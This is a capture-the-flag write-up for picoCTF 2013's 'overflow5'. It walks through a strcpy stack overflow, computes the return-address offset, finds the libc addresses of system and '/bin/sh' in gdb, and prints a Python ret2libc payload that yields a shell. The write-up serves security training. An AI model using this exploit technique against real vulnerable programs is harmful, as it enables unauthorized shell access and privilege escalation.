### S0lv3d by H4yicl3

First i download source here :https://2013.picoctf.com/problems/overflow5-0353c1a83cb2fa0d

then i use IDA to analysis the code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  __uid_t v4; // eax@3

  if ( argc == 2 )
  {
    v4 = geteuid();
    setresuid(v4, v4, v4);
    vuln((char *)argv[1]);				//<--------- the vuln function()
    result = 0;
  }
  else
  {
    puts("Usage: buffer_overflow_shellcode [str]");
    result = 1;
  }
  return result;
}
```

the vuln function here
```c
char *__cdecl vuln(char *a1)
{
  char v2; // [sp+10h] [bp-40Ch]@1     	//<------- overflow dest to modify return address

  return strcpy(&v2, a1);
}
```

find the offset between v2 and return
```
-0000040C var_40C         db ?
+00000000  r              db 4 dup(?)
```

offset = 0x40C(dest) + 0x0(return) =0x40C =1036
but the program had turned on NX flag()
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
```

so the way to get shell !! we need to excute system("/bin/sh")
and we can find it in libc
```
gdb-peda$ b *main
gdb-peda$ r
gdb-peda$ p &system
$1 = (<text variable, no debug info> *) 0xf7e4a310 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f6a84c ("/bin/sh")
```

the address of system is 0xf7e4a310
the address of /bin/sh is 0xf7f6a84c
we need excute the system("/bin/sh")
the python script i make look like
```python
padding ="A"*1036
address_system ="\x10\xa3\xe4\xf7"
return_after_system="AAAA"
address_binsh ="\x4c\xa8\xf6\xf7"
print padding + address_system + return_after_system +address_binsh
```

try run it
```
./overflow5 $(python overflow5.py)
$ whoami
hayicle
$ 
```

well done!!